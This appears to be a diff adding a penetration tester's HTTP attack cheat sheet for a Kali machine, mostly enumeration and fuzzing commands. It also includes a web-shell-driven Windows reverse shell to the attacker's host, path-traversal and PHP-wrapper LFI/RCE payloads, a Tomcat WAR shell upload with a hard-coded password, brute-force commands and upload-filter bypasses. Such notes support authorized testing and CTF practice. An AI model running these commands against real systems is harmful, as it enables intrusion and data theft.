@@ -1,0 +1,90 @@
+^Http notes:Service Discovery
+^Http notes:Version Check (Apache 2.4.49)
+^Http notes:Directory Busting
+^Http notes:Add/verify DNS hosts (/etc/hosts)
+^Http notes:Common Directories (robots.txt, sitemap.xml)
+^Http notes:Review Source Code (developer’s comments)
+^Http notes:Common/Default Credentials (admin:admin)
+^Http notes:Finding Exploits (google, github, searchsploit)
+^Http notes:Upload Files (testing of web app functions)
+^Http notes:Hydra (online bruteforce)
+nc:nc -vn <target> <port> #banner / TCP connect; kali-machine
+curl:curl -I http://<target>:<port>/ #fetch HTTP headers; kali-machine
+curl:curl http://<target>:<port>/ #fetch full page; kali-machine
+curl:curl -k -v --path-as-is -I http://<target>:<port> #probe HTTPS headers verbose; kali-machine
+curl:curl -k -A 'Mozilla/5.0' http://<target>:<port>/ #custom User-Agent; kali-machine
+curl:curl -s -O http://<target>:<port>/index.html #download file; kali-machine
+curl:curl -b 'PHPSESSID=<cookie>' http://<target>:<port>/ #use authenticated session cookie; kali-machine
+curl:curl -u <user>:<password> http://<target>:<port>/ #basic auth (flag); kali-machine
+curl:curl --path-as-is http://<user>:<password>@<target>:<port>/ #basic auth in URL; kali-machine
+curl:curl -H 'Authorization: Basic <base64creds>' http://<target>:<port>/ #basic auth header; kali-machine
+curl:curl -X POST -d 'username=<user>&password=<password>' http://<target>:<port>/subdirectory/endpoint #POST form login; kali-machine
+curl:curl -X POST -H 'Content-Type: application/json' --data-binary '{"username":"xyz","password":"xyz"}' http://<target>:<port>/api/login #POST JSON API login; kali-machine
+curl:curl -X POST -H 'Content-Type:application/json' --data-binary '{"search":"london"}' http://<SERVER_IP>:<PORT>/search.php #POST JSON search; kali-machine
+curl:curl -k -s --location -X POST --header 'Accept: application/json' -u <user>:<password> --data-raw '{"file":"../../../../etc/passwd"}' http://<target>:<port>/sub-directory/endpoint #authenticated JSON LFI; kali-machine
+curl:curl -k -i --path-as-is http://<target>:<port>/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd #LFI path-as-is; kali-machine
+curl:curl http://<target>:<port>/project/uploads/users/420919-backdoor.php --data-urlencode "cmd=whoami" #webshell RCE; kali-machine
+curl:curl -G <domain>/<path>/shell.php --data-urlencode 'cmd=nc64.exe -e cmd.exe <kali> <kaliPort>' #Windows reverse shell; kali-machine
+curl:curl -G <domain>/<path>/Dysco.php --data-urlencode 'cmd=.\update.exe' #execute uploaded payload; kali-machine
+curl:curl 'http://<target>/forgot?username=robert-dev-14522' -H 'Host:<target>:8081' #host header manipulation; kali-machine
+curl:curl --unix-socket /var/run/docker.sock http://localhost/containers/json #Docker socket abuse; kali-machine
+curl:curl -I http://<target> #external header check; kali-machine
+curl:curl -s http://<SERVER_IP>:<PORT>/api.php/city/ | jq #parse JSON API output; kali-machine
+curl:curl -u admin:admin http://<SERVER_IP>:<PORT>/ #credential reuse test; kali-machine
+curl:curl -u tomcat:\$3cureP4s5w0rd123! -T shell.war http://megahosting.htb:8080/manager/text/de #Tomcat WAR upload; kali-machine
+curl:curl -X DELETE http://<SERVER_IP>:<PORT>/api.php/city/New_HTB_City #API DELETE request; kali-machine
+curl:curl http://<target>/latest/meta-data/ | grep "/" #cloud metadata enum; kali-machine
+curl:curl -k -i --path-as-is https://<target>:<port>/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd # test traversal/LFI that requires raw path handling
+curl:false || curl -s "http://<target>:<port>/?cmd=whoami" | grep -i "root" # cheap RCE smoke test for cmd param returning root
+^feroxbuster:feroxbuster -u http://<target>:<port>/ -t 10 -w <wordlist1> -x "txt,html,php,asp,aspx,jsp" -v -k -L4 -e #feroxbuster with extensions deep mode; kali-machine
+feroxbuster:feroxbuster -u http://<domain> -t 10 -w <wordlist1> -x "txt,html,php,asp,aspx,jsp" -v -k -n -e #directory discovery with feroxbuster on domain; kali-machine
+feroxbuster:feroxbuster -u http://<target>:<port>/ -t 10 -w <wordlist1> --filter-status 400,401,403,404 -L 2 #directory discovery with feroxbuster on target; kali-machine
+gobuster:gobuster dir -u http://<target>:<port>/ -w <wordlist1> -s 307,200,204,301,302,403 -t 50 #directory busting with status filtering; kali-machine
+gobuster:gobuster dir -u http://<target>:<port>/ -w <wordlist1> -t 50 -o <filename1> #directory busting with output file; kali-machine
+gobuster:gobuster dir -u http://<target>:<port>/ -w <wordlist1> -t 50 -o <filename1> -x "php,txt,aspx" #directory busting with extensions; kali-machine
+gobuster:gobuster vhost -u http://<target>:<port>/ -w <wordlist1> -o <filename1> #vhost discovery via Host header; kali-machine
+gobuster:gobuster dir -p socks5://<target>:1080 --url http://<target>:<port>/ -w <wordlist1> #directory busting over SOCKS proxy; kali-machine
+gobuster:gobuster dir -u http://<target>:<port> -w <wordlist1> #quick directory busting with dirb common list; kali-machine
+gobuster:gobuster dns -d <domain> -w dns-jhaddix.txt #DNS subdomain brute-force; kali-machine
+^hosts helper:printf '<target> %s\n' "$(curl -s http://<target>:<port>/ | grep -oE 'https?://[^"' ]+|[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+.[A-Za-z]{2,}' | sed -E 's~https?://~~; s~/.*~~; s/.*@//; s/:.*$//' | sort -u | paste -sd' ' -)" #generate hosts from target page; kali-machine
+^hosts helper:printf '%s %s\n' "<target>" "$(curl -fsSL http://<target>:<port>/ | grep -aoE 'https?://[^"[:space:]]+|[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}' | sed -E 's~^https?://~~; s~/.*~~; s/.*@//; s/:.*$//' | sort -u | paste -sd' ' -)" #scrape URLs/emails, normalize to hostnames, dedupe, single hosts-file line; kali-machine
+^hosts helper:printf '%s %s\n' "<target>" "$(curl -fsSL http://<target>:<port>/ | grep -aoE 'https?://[^"[:space:]]+|[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}' | sed -E 's~^https?://~~; s~/.*~~; s/.*@//; s/:.*$//' | grep -E '^[A-Za-z0-9.-]+\.[A-Za-z]{2,}$' | sort -u | paste -sd' ' -)" #strict domain-only extraction suitable for /etc/hosts; kali-machine
+^hosts helper:curl -fsSL http://<target>:<port>/ | grep -aoE 'https?://[^"[:space:]]+|[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}' | sed -E 's~^https?://~~; s~/.*~~; s/.*@//; s/:.*$//' | sort -u | awk -v t="<target>" '{print t, $0}' #emit one "<target> hostname" per line for easy /etc/hosts append; kali-machine
+ffuf:ffuf -w <wordlist1> -u http://<target>:<port>/FUZZ #directory discovery; kali-machine
+ffuf:ffuf -c -w "<wordlist1>:FILE" -H "X-Originating-IP: 127.0.0.1, X-Forwarded-For: 127.0.0.1" -fs 5682,0 -u http://<target>:<port>/FUZZ #bypass filters with spoofed headers; kali-machine
+ffuf:ffuf -w <wordlist1> -u http://<target>:<port>/FUZZ -mc all -fs 42 -c -v #filter by response size with verbose output; kali-machine
+ffuf:ffuf -w <wordlist1> -u http://<target>:<port>/ -H "Host: FUZZ" -mc 200 #vhost discovery via Host header; kali-machine
+ffuf:ffuf -w <wordlist1> -u http://<target>:<port>/api/users/validate -X POST -H "Content-Type: application/json" -d '{"email":"FUZZ@casp.casp","password":"dummy"}' -mr "incorrect" -o <filename1> #API user enumeration via POST; kali-machine
+ffuf:ffuf -w <wordlist1>:FUZZOBJECTS,<wordlist2>:FUZZACTIONS -u http://<target>:<port>/api/FUZZOBJECTS/FUZZACTIONS -o <filename1> #multi-parameter API path fuzzing; kali-machine
+ffuf:ffuf -w <wordlist1>:FUZZ -u 'http://<target>:<port>/xxx.php?language=FUZZ' -fs 0 #LFI parameter fuzzing; kali-machine
+ffuf:ffuf -u http://<domain>:<port>/FUZZ/ -k -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt #directory discovery with raft wordlist; kali-machine
+wget:wget -r -np -nH --cut-dirs=N http://<target>/ .git/ #wget recursive download of .git; kali-machine
+nikto:nikto -h http://<target>:<port>/ #nikto web vuln scan; kali-machine
+whatweb:whatweb http://<target>:<port>/ #whatweb service fingerprinting; kali-machine
+wpscan:wpscan --url http://<target>:<port>/ --enumerate p #wpscan WordPress plugin scan; kali-machine
+wpscan:wpscan --url http://<target>:<port>/ --enumerate u #wpscan WordPress user scan; kali-machine
+wpscan:wpscan --url http://<target>:<port>/ --enumerate vp #wpscan WordPress vuln scan; kali-machine
+wpscan:wpscan --url http://<target>:<port>/ --usernames <filename1> --passwords <filename2> #wpscan WordPress bruteforce; kali-machine
+davtest:davtest -url http://<target>:<port>/ #davtest webdav check; kali-machine
+cewl wordlist:cewl -d 3 -m 5 http://<target>:<port>/ -w cewl-wordlist.txt #depth & min word length; kali-machine
+cewl wordlist:cewl http://<target>:<port>/directory/path -w cewl-wordlist.txt #direct path; kali-machine
+hydra HTTP post-form example:hydra -l admin -P <wordlist1> <target> -s <port> http-post-form '/admin/login.php:username=^USER^&password=^PASS^&login=:Invalid password' -V #login bruteforce; kali-machine
+php wrapper:curl -s "http://<target>:<port>/menu.php?file=data:text/plain,helloworld" | grep "helloworld" #poc; kali-machine
+php wrapper:http://<target>:<port>/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?> #execute commands; kali-machine
+php wrapper:http://<target>:<port>/fileincl/example1.php?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd #lfi; kali-machine
+file upload bypass:change file format (.phps or .php7 or .phtml) #kali-machine
+file upload bypass:change character case (.pHP) #kali-machine
+^powershell/cmd checker:(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell; kali-machine
+^subdomain fuzzing:wfuzz -u http://<target>:<port> -H "Host: FUZZ.<domain>" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 7069 #kali-machine
+directory traversal:dotdotpwn -m http-url -u http://<target>:<port>/<path>/TRAVERSAL -O -k "root:" -r ddp-results.txt #linux; kali-machine
+directory traversal:dotdotpwn -m http-url -u http://<domain>:<port>/<path>/TRAVERSAL -O -k "root:" -r ddp-results.txt #linux; kali-machine
+directory traversal:dotdotpwn -m http-url -u http://<target>:<port>/<path>/index.php?page=TRAVERSAL -o windows -k 'mci extensions' -r ddp-results.txt #windows; kali-machine
+directory traversal:dotdotpwn -m http-url -u http://<domain>:<port>/<path>/index.php?page=TRAVERSAL -o windows -k 'mci extensions' -r ddp-results.txt #windows; kali-machine
+directory traversal:dotdotpwn -m http-url -u http://<target>:<port>/<path>/index.php?page=TRAVERSAL -o windows -k 'localhost' -r ddp-results.txt #windows; kali-machine
+directory traversal:dotdotpwn -m http-url -u http://<domain>:<port>/<path>/index.php?page=TRAVERSAL -o windows -k 'localhost' -r ddp-results.txt #windows; kali-machine
+http file upload:echo "AddType application/x-httpd-php .dork" > .htaccess #php file upload .htaccess; allowing .php to be uploaded; target-machine
+username-generation:/home/kali/Tools/git-tools/username-anarchy/username-anarchy -i <wordlist1> #generate username permutations from a list of names (first/last/full); kali-machine
+username-generation:/home/kali/Tools/git-tools/username-anarchy/username-anarchy --recognise <user> #analyze an existing username to infer naming scheme and likely permutations; kali-machine
+SQL Injection Wordlist:http://github.com/PenTestical/sqli/blob/main/hugeSQL.txt #kali-machine
+SQL Injection Wordlist:/usr/share/payloadsallthethings/SQL Injection #kali-machine
+Auth Bypass Wordlist:http://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/exploit/Auth_Bypass.txt #kali-machine
